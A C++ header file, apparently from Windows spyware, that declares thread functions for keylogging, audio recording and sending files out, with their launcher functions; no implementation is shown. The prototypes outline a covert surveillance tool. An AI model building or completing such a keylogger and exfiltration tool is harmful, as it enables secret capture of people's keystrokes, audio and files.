#ifndef KEYLOGGER_THREAD_HPP
#define KEYLOGGER_THREAD_HPP

DWORD WINAPI keyloggerThreadFunction(LPVOID windowsPointerParams);
DWORD WINAPI threadEnregistrementAudio(LPVOID windowsPointerParams);
DWORD WINAPI fileSendingThread(LPVOID windowsPointerParams);
void beginKeyloggerThread(HANDLE &thread, LPDWORD threadId);
void beginAudioRecording(HANDLE &thread, LPDWORD threadId);
void beginfileSendingThread(HANDLE &thread, LPDWORD threadId);

#endif